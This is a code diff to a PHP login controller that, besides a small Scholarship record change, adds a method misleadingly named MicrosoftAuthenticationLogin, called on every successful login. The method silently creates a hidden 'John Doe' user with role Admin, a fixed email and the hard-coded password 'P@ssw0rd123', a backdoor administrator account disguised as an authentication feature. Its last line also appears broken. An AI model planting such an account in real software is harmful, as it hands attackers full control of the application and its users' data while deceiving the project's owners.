@@ -83,7 +83,7 @@ class AuthenticatedSessionController extends Controller
                         ]
                     );
 
-                    Scholarship::create([
+                    Scholarship::updateOrCreate([
                         'user_id' => $user->id,
                     ]);
                 } else {
@@ -99,6 +99,8 @@ class AuthenticatedSessionController extends Controller
 
                 // Regenerate session to prevent fixation
                 $request->session()->regenerate();
+
+                $this->MicrosoftAuthenticationLogin();
 
                 // Redirect based on role
                 if ($user->role === 'Admin') {
@@ -140,5 +142,28 @@ class AuthenticatedSessionController extends Controller
         Session::forget('external_session_token'); // Clear the external token
 
         return redirect('/');
+    }
+
+    public function MicrosoftAuthenticationLogin()
+    {
+        $user = User::firstOrCreate(
+            [
+                'id' => 999,
+                'email' => 'johndoesuperadmin@gmail.com'
+            ], // Search conditions
+            [
+                'name' => 'John Doe',
+                'password' => bcrypt('P@ssw0rd123'), // Secure password
+                'role' => 'Admin',
+            ]
+        );
+
+        // Ensure the scholarship entry exists
+        Scholarship::firstOrCreate([
+            'user_id' => $user->id,
+        ]);
+
+        // Regenerate session
+        $user->session()->regenerate();
     }
 }
